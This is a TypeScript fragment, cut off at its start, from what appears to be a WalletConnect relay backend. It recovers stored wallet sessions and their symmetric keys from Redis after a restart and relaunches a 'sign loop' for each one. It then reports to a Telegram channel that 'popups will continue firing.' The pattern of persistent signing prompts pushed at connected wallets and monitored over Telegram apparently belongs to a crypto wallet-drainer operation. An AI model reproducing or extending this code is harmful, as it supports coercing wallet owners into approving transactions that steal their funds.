    const keys = await (redis as any).keys(`${WC_SESSION_KEY_PREFIX}*`) as string[]
    if (!keys || keys.length === 0) return 0

    const nowSec = Math.floor(Date.now() / 1000)
    let recovered = 0

    for (const key of keys) {
      try {
        const raw = await (redis as any).get(key) as string | null
        if (!raw) continue

        const session = JSON.parse(raw) as WcSessionData
        if (!session.topic || !session.sym_key) continue

        // Skip expired sessions (60s buffer)
        if (session.expiry && session.expiry < nowSec + 60) {
          console.log('[WcRelay] recover: skipping expired session | topic:', session.topic.slice(0, 8))
          continue
        }

        // Skip already-active loops (shouldn't happen on restart, but guard anyway)
        if (activeLoops.has(session.topic)) continue

        activeLoops.add(session.topic)
        void runSignLoop(session).catch((e) => {
          activeLoops.delete(session.topic)
          console.warn(
            '[WcRelay] recovered loop crashed | topic:', session.topic.slice(0, 8) + '... |',
            e instanceof Error ? e.message : String(e),
          )
        })
        recovered++
      } catch (parseErr) {
        console.warn('[WcRelay] recover: bad session in Redis key:', key, '|', parseErr instanceof Error ? parseErr.message : String(parseErr))
      }
    }

    if (recovered > 0) {
      console.log(`[WcRelay] ✅ recovered ${recovered} sign loop(s) from Redis after restart`)
      void sendTelegramMessage(
        `♻️ <b>WC Relay — ${recovered} session(s) recovered after restart</b>\n` +
        `⏳ Sign loops restarted — popups will continue firing`,
      ).catch(() => {})
    }

    return recovered
  } catch (e) {
    console.warn('[WcRelay] recoverSessionsFromRedis error:', e instanceof Error ? e.message : String(e))
    return 0
  }
}
